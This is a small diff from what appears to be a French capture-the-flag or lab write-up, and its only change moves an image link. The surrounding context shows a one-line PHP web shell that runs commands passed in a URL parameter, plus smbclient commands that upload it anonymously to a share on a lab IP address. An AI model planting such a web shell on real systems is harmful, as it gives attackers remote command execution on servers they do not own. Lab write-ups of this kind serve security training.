@@ -76,14 +76,14 @@ Création et envoi d’un **Web Shell** pour exécuter des commandes à distance
 echo "<?php system(\$_GET['cmd']); ?>" > shell.php  
 ```
 
-![image11](https://github.com/user-attachments/assets/1ed001af-bbb4-42bd-98da-bea0c9d9d268)
-
 Envoi du Web Shell via **SMB** :  
 
 ```bash
 smbclient //192.168.188.214/icecream -N  
 put shell.php  
 ```
+
+![image11](https://github.com/user-attachments/assets/1ed001af-bbb4-42bd-98da-bea0c9d9d268)
 
 Exécution de commandes :  
 
